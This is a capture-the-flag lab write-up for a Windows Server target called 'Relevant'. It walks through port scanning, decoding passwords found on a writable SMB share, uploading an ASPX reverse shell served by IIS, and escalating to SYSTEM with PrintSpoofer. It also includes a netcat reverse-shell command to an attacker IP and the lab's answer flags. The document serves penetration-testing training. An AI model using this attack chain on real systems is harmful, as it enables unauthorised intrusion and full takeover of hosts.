# Relevant Writeup

> You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

## Solution

First reconnaissance and port scanning.

```shell
nmap -Pn -T4 --min-rate 3000 10.129.184.206 -p- -oN scan.txt
```

```text
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
```

It's better to scan only the open ports instead of all.

```shell
cat scan.txt | grep '^[0-9].*open' | cut -d '/' -f1 | paste -sd ',' '-'

80,135,139,445,3389,49663,49666,49667
```

```shell
nmap -Pn -T4 -sV -sC 10.129.184.206 -p 80,135,139,445,3389,49663,49666,49667
```

```text
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2026-10-28T20:44:08
|_Not valid after:  2027-04-29T20:44:08
|_ssl-date: 2026-10-29T20:49:45+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2026-10-29T20:49:26+00:00
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RELEVANT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-10-29T13:49:30-07:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h24m00s, deviation: 3h07m52s, median: 0s
| smb2-time: 
|   date: 2026-10-29T20:49:27
|_  start_date: 2026-10-29T20:44:06
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

There is two important ports that we have to discover 445 (SMB) and 80, 49663 (HTTP).

First let's start with SMB.

```shell
nxc smb 10.129.184.206 -u "guest" -p "" --shares 
```

```text
SMB         10.129.184.206   445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.129.184.206   445    RELEVANT         [+] Relevant\guest: 
SMB         10.129.184.206   445    RELEVANT         [*] Enumerated shares
SMB         10.129.184.206   445    RELEVANT         Share           Permissions     Remark
SMB         10.129.184.206   445    RELEVANT         -----           -----------     ------
SMB         10.129.184.206   445    RELEVANT         ADMIN$                          Remote Admin
SMB         10.129.184.206   445    RELEVANT         C$                              Default share
SMB         10.129.184.206   445    RELEVANT         IPC$            READ            Remote IPC
SMB         10.129.184.206   445    RELEVANT         nt4wrksv        READ,WRITE     
```

We found a share `nt4wrksv` and we have the permission to read and write.

```shell
smbclient //10.129.184.206/nt4wrksv

Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 21:46:04 2020
  ..                                  D        0  Sat Jul 25 21:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 15:15:33 2020

                7735807 blocks of size 4096. 5098795 blocks available
smb: \> get passwords.txt 
getting file \passwords.txt of size 98 as passwords.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> exit
```

There is a `passwords.txt` file, let's see what we have.

```shell
cat passwords.txt

[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk 
```

```shell
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123
```

```shell
echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$
```

We have found the usernames and passwords, but the problem is that we are unable to log in via RDP on port 3389. 
That means this users don't have the permission to access via RDP. It's just a rabbit hole.

So we have to find another way. Now let's check the HTTP on both ports 80 and 49663.
After a wile i notice when we enter http://10.129.184.206:49663/nt4wrksv/passwords.txt we can access the same file on the SMB shares.
And we also know that we have the permission to write files on this share. So my goal now is to load a reverse shell with the extension `.aspx` for the IIS server and then we can run it from the web.

I used https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx for the reverse shell.

```shell
wget "https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx"
```

```shell
smbclient //10.129.184.206/nt4wrksv

Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (67.2 kB/s) (average 67.2 kB/s)
smb: \> 
smb: \> ls
  .                                   D        0  Thu Oct 29 21:01:12 2026
  ..                                  D        0  Thu Oct 29 21:01:12 2026
  passwords.txt                       A       98  Sat Jul 25 15:15:33 2020
  shell.aspx                          A    15973  Thu Oct 29 21:01:13 2026

                7735807 blocks of size 4096. 5050736 blocks available
smb: \> exit
```

```shell
nc -lnvp 1234
```

Now after browsing http://10.129.184.206:49663/nt4wrksv/shell.aspx we gonna successfully have a shell.

```cmd
type C:\Users\Bob\Desktop\user.txt
```

```text
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

> User Flag
> 
> THM{fdk4ka34vk346ksxfr21tg789ktf45}

Now we have to find a way to become Administrator.

```cmd
whoami /priv
```

```text
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We have a very critical privilege `SeImpersonatePrivilege`, we can use it to escalate our privileges, and there is a lot of tools that can help us like: (PrintSpoofer, JuicyPotato, SigmaPotato...).
I used PrintSpoofer.

```shell
wget "https://github.com/itm4n/PrintSpoofer/releases/PrintSpoofer64.exe"
```

After install it in our machine we have send it to the target machine. In this case i used SMB.

```shell
impacket-smbserver -smb2support share .
```

Now in the target machine.

```cmd
cd C:\Users\Public
```

```cmd
copy \\192.168.130.58\share\PrintSpoofer64.exe
```

```cmd
.\PrintSpoofer64.exe --help
```

```text
PrintSpoofer v0.1 (by @itm4n)

  Provided that the current user has the SeImpersonate privilege, this tool will leverage the Print
  Spooler service to get a SYSTEM token and then run a custom command with CreateProcessAsUser()

Arguments:
  -c <CMD>    Execute the command *CMD*
  -i          Interact with the new process in the current command prompt (default is non-interactive)
  -d <ID>     Spawn a new process on the desktop corresponding to this session *ID* (check your ID with qwinsta)
  -h          That's me :)

Examples:
  - Run PowerShell as SYSTEM in the current console
      PrintSpoofer.exe -i -c powershell.exe
  - Spawn a SYSTEM command prompt on the desktop of the session 1
      PrintSpoofer.exe -d 1 -c cmd.exe
  - Get a SYSTEM reverse shell
      PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"
```

I will use `Get a SYSTEM reverse shell via nc.exe`. Again we have to install the nc.exe for windows in our machine and then send it via SMB.

```shell
wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe
```

```cmd
copy \\192.168.130.58\share\nc64.exe 
```

We have to listen again for the reverse shell before runing the command.

```shell
nc -lnvp 6666
```

```cmd
.\PrintSpoofer64.exe -c "nc64.exe 192.168.130.58 6666 -e cmd"
```

We have another shell now. Let’s see what we have become now.

```cmd
whoami
nt authority\system
```

That's it we have the highest level of local privileges.

```shell
type C:\Users\Administrator\Desktop\root.txt
```

```text
THM{1fk5kf469devly1gl320zafgl345pv}
```

> Root Flag
> 
> THM{1fk5kf469devly1gl320zafgl345pv}

